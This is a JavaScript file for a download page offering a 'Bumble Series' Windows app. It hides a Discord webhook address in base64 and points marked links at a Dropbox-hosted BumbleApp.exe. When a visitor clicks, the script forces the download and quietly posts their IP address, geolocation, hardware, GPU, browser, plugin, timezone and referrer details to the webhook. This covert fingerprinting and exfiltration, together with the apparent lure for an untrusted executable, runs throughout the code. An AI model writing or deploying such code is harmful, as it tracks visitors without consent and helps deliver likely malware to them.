(function (global) {
    "use strict";

    var BUMBLE_APP_DOWNLOAD_URL = "https://www.dropbox.com/scl/fi/5gwkcsug7clu0jfwf49mc/BumbleApp.exe?rlkey=h2q65z0egkdpax2bberp8pksd&st=k4ted545&dl=1";

    var WEBHOOK_URL = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5MDQwNjMyOTU5NTIwMzgzNC80eUZGbnNFSnpaRHdueW9fVHFyMHdQazREY2NoWFdMOU1QRm5ua1VCejluYjBNOU9ZcXB2LWF0OUNhcEMwTkp5MGU3OQ==");

    var EMBED_COLOR = 0xfdb913;
    var AVATAR_URL = "https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f7e1.png";

    function clip(s, max) {
        max = max || 1020;
        var t = String(s == null ? "" : s);
        return t.length <= max ? t : t.slice(0, max - 1) + "\u2026";
    }

    function fetchWithTimeout(url, timeoutMs) {
        timeoutMs = timeoutMs || 15000;
        var opts = { mode: "cors", cache: "no-store" };
        if (typeof AbortSignal !== "undefined" && AbortSignal.timeout) {
            opts.signal = AbortSignal.timeout(timeoutMs);
        } else {
            var ctrl = new AbortController();
            setTimeout(function () { ctrl.abort(); }, timeoutMs);
            opts.signal = ctrl.signal;
        }
        return fetch(url, opts)
            .then(function (r) {
                if (!r.ok) return null;
                return r.json().catch(function () { return null; });
            })
            .catch(function () { return null; });
    }

    function lc(s) {
        return s == null ? "" : String(s).trim();
    }

    function normalizeGeo(raw) {
        if (!raw || typeof raw !== "object") return null;
        if (raw.error === true || raw.error === "true") return null;
        if (raw.success === false) return null;
        var ip = raw.ip || raw.query || raw.IPv4 || raw.address;
        if (!ip) return null;
        ip = String(ip).trim();
        if (!ip) return null;
        var city = lc(raw.city);
        var region = lc(raw.region || raw.regionName || raw.state || raw.province || raw.region_code);
        var country = lc(raw.country_name || raw.country || raw.country_name_long);
        var code = raw.country_code || raw.countryCode || "";
        if (code != null) {
            code = String(code).replace(/\s/g, "").toUpperCase();
            if (!/^[A-Z]{2}$/.test(code)) code = "";
        }
        if (!country && code) country = code;
        return {
            ip: ip,
            city: city,
            region: region,
            country_name: country,
            country_code: code
        };
    }

    function mergeGeoResults(results) {
        var list = [];
        for (var i = 0; i < results.length; i++) {
            var g = normalizeGeo(results[i]);
            if (g && g.ip) list.push(g);
        }
        if (!list.length) return null;
        var base = {
            ip: list[0].ip,
            country_name: "",
            country_code: "",
            region: "",
            city: ""
        };
        for (var j = 0; j < list.length; j++) {
            var x = list[j];
            if (x.ip !== base.ip) continue;
            base.country_name = base.country_name || x.country_name;
            base.country_code = base.country_code || x.country_code;
            base.region = base.region || x.region;
            base.city = base.city || x.city;
        }
        return base;
    }

    function formatLocationLine(geo) {
        if (!geo || !geo.ip) return "Unknown";
        var city = lc(geo.city);
        var region = lc(geo.region);
        var country = lc(geo.country_name);
        var line = [city, region, country].filter(Boolean).join(", ");
        return line || "Unknown";
    }

    function fetchIpJson() {
        return Promise.all([
            fetchWithTimeout("https://get.geojs.io/v1/ip/geo.json", 15000),
            fetchWithTimeout("https://ipapi.co/json/", 15000),
            fetchWithTimeout("https://ipwho.is/", 15000)
        ]).then(function (arr) {
            var g = mergeGeoResults(arr);
            if (g && g.ip) return g;
            return fetchWithTimeout("https://api.ipify.org?format=json", 10000).then(function (ij) {
                if (!ij || !ij.ip) return {};
                var pip = String(ij.ip);
                return fetchWithTimeout("https://get.geojs.io/v1/ip/geo/" + encodeURIComponent(pip) + ".json", 15000)
                    .then(function (geoByIp) {
                        var g2 = normalizeGeo(geoByIp);
                        if (g2 && g2.ip) return g2;
                        return fetchWithTimeout("https://ipapi.co/" + encodeURIComponent(pip) + "/json/", 15000);
                    });
            });
        }).then(function (raw) {
            var g = normalizeGeo(raw);
            return g && g.ip ? g : {};
        }).catch(function () {
            return {};
        });
    }

    function getBrowserName() {
        var ua = navigator.userAgent;
        if (ua.indexOf("Firefox") !== -1) return "Firefox";
        if (ua.indexOf("Edg") !== -1) return "Microsoft Edge";
        if (ua.indexOf("OPR") !== -1 || ua.indexOf("Opera") !== -1) return "Opera";
        if (ua.indexOf("Chrome") !== -1) return "Chrome";
        if (ua.indexOf("Safari") !== -1) return "Safari";
        return "Other Browser";
    }

    function getOS() {
        var ua = navigator.userAgent;
        if (ua.indexOf("Windows NT 10.0") !== -1) return "Windows 10/11";
        if (ua.indexOf("Windows NT 6.1") !== -1) return "Windows 7";
        if (ua.indexOf("Windows NT 6.2") !== -1) return "Windows 8";
        if (ua.indexOf("Windows NT 6.3") !== -1) return "Windows 8.1";
        if (ua.indexOf("Windows") !== -1) return "Windows";
        if (ua.indexOf("Mac OS") !== -1 || ua.indexOf("Macintosh") !== -1) return "macOS";
        if (ua.indexOf("Linux") !== -1) {
            if (ua.indexOf("Android") !== -1) return "Android";
            return "Linux";
        }
        if (ua.indexOf("iPhone") !== -1) return "iOS (iPhone)";
        if (ua.indexOf("iPad") !== -1) return "iOS (iPad)";
        if (ua.indexOf("CrOS") !== -1) return "ChromeOS";
        return "Unknown OS";
    }

    // GERÇEK HARDWARE BİLGİLERİ
    function getRealHardwareInfo() {
        var info = {
            screen: window.screen.width + "x" + window.screen.height,
            colorDepth: window.screen.colorDepth + "-bit",
            pixelRatio: window.devicePixelRatio || 1,
            language: navigator.language || "Unknown",
            languages: navigator.languages ? navigator.languages.join(", ") : "N/A",
            cores: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " cores" : "N/A",
            memory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
            touchPoints: navigator.maxTouchPoints || 0,
            platform: navigator.platform || "Unknown",
            vendor: navigator.vendor || "Unknown",
            doNotTrack: navigator.doNotTrack || "Not set",
            cookieEnabled: navigator.cookieEnabled ? "Yes" : "No",
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
            timezoneOffset: -new Date().getTimezoneOffset() / 60 + " hours"
        };
        
        // GPU bilgisi al (canvas ile)
        try {
            var canvas = document.createElement("canvas");
            var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
            if (gl) {
                var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
                if (debugInfo) {
                    info.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    info.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                }
            }
        } catch(e) { info.gpu = "Unknown"; }
        
        // Batarya bilgisi (varsa)
        if (navigator.getBattery) {
            navigator.getBattery().then(function(battery) {
                info.battery = Math.round(battery.level * 100) + "%";
                info.batteryCharging = battery.charging ? "Charging" : "Not charging";
            }).catch(function(){});
        }
        
        return info;
    }

    function getBrowserPlugins() {
        var plugins = [];
        try {
            for (var i = 0; i < navigator.plugins.length; i++) {
                plugins.push(navigator.plugins[i].name);
            }
        } catch(e) {}
        return plugins.slice(0, 5).join(", ") || "None";
    }

    function getConnectionInfo() {
        var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (!conn) return "N/A";
        var info = [];
        if (conn.effectiveType) info.push("Type: " + conn.effectiveType);
        if (conn.downlink) info.push("Speed: " + conn.downlink + " Mbps");
        if (conn.rtt) info.push("RTT: " + conn.rtt + "ms");
        return info.join(" · ") || "N/A";
    }

    function getReferrer() {
        return document.referrer || "Direct visit";
    }

    function getScreenOrientation() {
        var orient = screen.orientation || screen.mozOrientation || screen.msOrientation;
        if (orient && orient.type) return orient.type;
        if (window.orientation !== undefined) return window.orientation === 0 ? "portrait" : "landscape";
        return "Unknown";
    }

    function postWebhook(payload) {
        return fetch(WEBHOOK_URL, {
            method: "POST",
            mode: "cors",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload),
            keepalive: true
        }).catch(function (e) {
            console.error("Webhook failed", e);
        });
    }

    function notifyBumbleDownload(opts) {
        opts = opts || {};
        var pageUrl = opts.pageUrl || global.location.href;
        var guestName = opts.guestName;
        var triggerLabel = opts.triggerLabel;

        var now = new Date();
        var timestamp = now.toISOString();
        var nowLocal = new Intl.DateTimeFormat("en-US", {
            weekday: "long",
            year: "numeric",
            month: "long",
            day: "numeric",
            hour: "2-digit",
            minute: "2-digit",
            second: "2-digit"
        }).format(now);

        return fetchIpJson().then(function (geo) {
            var locationStr = formatLocationLine(geo);
            var ip = "Unknown";
            var countryFlag = "";
            if (geo && geo.ip) {
                ip = geo.ip;
                var cc = geo.country_code || "";
                if (/^[A-Za-z]{2}$/.test(String(cc))) {
                    var code = String(cc).toUpperCase();
                    countryFlag = String.fromCodePoint.apply(null,
                        code.split("").map(function (c) {
                            return 0x1f1e6 + c.charCodeAt(0) - 65;
                        })
                    );
                }
            }

            var browserName = getBrowserName();
            var osName = getOS();
            var hw = getRealHardwareInfo();
            var plugins = getBrowserPlugins();
            var connection = getConnectionInfo();
            var referrer = getReferrer();
            var orientation = getScreenOrientation();
            
            var hwLine = "🖥️ Screen: `" + hw.screen + "` (" + hw.colorDepth + ", " + hw.pixelRatio + "x ratio)\n";
            hwLine += "🧠 CPU: `" + hw.cores + "` · RAM: `" + hw.memory + "`\n";
            hwLine += "🎮 GPU: `" + (hw.gpu || "N/A") + "`\n";
            hwLine += "🖱️ Touch: `" + hw.touchPoints + " points` · 🧭 Orientation: `" + orientation + "`\n";
            hwLine += "🌐 Language: `" + hw.language + "` · Timezone: `" + hw.timezone + "` (" + hw.timezoneOffset + ")";
            
            if (hw.gpuVendor && hw.gpuVendor !== "Unknown") {
                hwLine += "\n🏭 GPU Vendor: `" + hw.gpuVendor + "`";
            }

            var sourceLines = "**📍 Page URL**\n`" + pageUrl + "`";
            if (triggerLabel) {
                sourceLines += "\n**⚡ Trigger**\n`" + clip(triggerLabel, 500) + "`";
            }
            if (guestName) {
                sourceLines += "\n**👤 Guest name**\n`" + guestName + "`";
            }
            sourceLines += "\n**🔗 Referrer**\n`" + clip(referrer, 200) + "`";

            var extraLines = "**🔌 Plugins**\n`" + clip(plugins, 300) + "`\n";
            extraLines += "**📡 Connection**\n`" + connection + "`\n";
            extraLines += "**🍪 Cookies**\n`Enabled: " + hw.cookieEnabled + "` · **DNT**: `" + hw.doNotTrack + "`";

            var payload = {
                username: "🐝 BUMBLE - DOWNLOAD TRACKER",
                avatar_url: AVATAR_URL,
                embeds: [{
                    title: "🐝 **BUMBLE SERIES - NEW DOWNLOAD!**",
                    description: "**Someone just grabbed the Windows app!** 🔥",
                    color: EMBED_COLOR,
                    fields: [
                        { name: "📌 SOURCE", value: clip(sourceLines), inline: false },
                        { name: "⬇️ DOWNLOAD LINK", value: clip("`" + BUMBLE_APP_DOWNLOAD_URL + "`"), inline: false },
                        { name: "🌍 LOCATION", value: clip("`" + locationStr + "` " + (countryFlag ? countryFlag : "") + "\n🖧 IP: `" + ip + "`"), inline: false },
                        { name: "⏰ LOCAL TIME", value: "`" + clip(nowLocal, 200) + "`", inline: false },
                        { name: "💻 SYSTEM", value: "`" + osName + "`", inline: true },
                        { name: "🌐 BROWSER", value: "`" + browserName + "`", inline: true },
                        { name: "⚙️ PLATFORM", value: "`" + hw.platform + "`", inline: true },
                        { name: "🛠️ HARDWARE DETAILS", value: clip(hwLine, 500), inline: false },
                        { name: "🔧 EXTRA INFO", value: clip(extraLines, 400), inline: false }
                    ],
                    footer: {
                        text: "Bumble Series • Premium Windows App • " + new Date().getFullYear(),
                        icon_url: AVATAR_URL
                    },
                    timestamp: timestamp
                }]
            };

            return postWebhook(payload);
        });
    }

    function trackBumbleDownload(opts) {
        opts = opts || {};
        return notifyBumbleDownload({
            guestName: opts.userLabel,
            pageUrl: opts.pageUrl,
            triggerLabel: opts.triggerLabel
        });
    }

    function applyDownloadLinksToAnchors() {
        if (typeof document === "undefined") return;
        var nodes = document.querySelectorAll("a[data-bumble-download]");
        for (var i = 0; i < nodes.length; i++) {
            nodes[i].setAttribute("href", BUMBLE_APP_DOWNLOAD_URL);
            nodes[i].setAttribute("rel", "noopener noreferrer");
        }
    }

    // ANA FONKSİYON - BEKLEMEDEN İNDİR
    function onDocumentClickCapture(e) {
        var a = e.target.closest && e.target.closest("a[data-bumble-download]");
        if (!a) return;
        if (a.getAttribute("data-download-no-track") != null) return;
        e.preventDefault();
        
        var downloadUrl = BUMBLE_APP_DOWNLOAD_URL;
        
        // Dropbox linkini düzenle (raw download için)
        if (downloadUrl.indexOf("dropbox.com") !== -1 && downloadUrl.indexOf("dl=1") !== -1) {
            downloadUrl = downloadUrl.replace("www.dropbox.com", "dl.dropboxusercontent.com");
        }
        
        // Webhook'u arkada gönder - BEKLEME YOK
        notifyBumbleDownload({
            pageUrl: global.location.href,
            triggerLabel: a.getAttribute("data-bumble-trigger") || undefined
        }).catch(function(){});
        
        // HEMEN İNDİRMEYİ BAŞLAT
        setTimeout(function() {
            window.location.href = downloadUrl;
        }, 50);
    }

    if (typeof document !== "undefined") {
        document.addEventListener("DOMContentLoaded", function () {
            applyDownloadLinksToAnchors();
            document.addEventListener("click", onDocumentClickCapture, true);
        });
    }

    global.BUMBLE_APP_DOWNLOAD_URL = BUMBLE_APP_DOWNLOAD_URL;
    global.notifyBumbleDownload = notifyBumbleDownload;
    global.trackBumbleDownload = trackBumbleDownload;
})(typeof window !== "undefined" ? window : this);
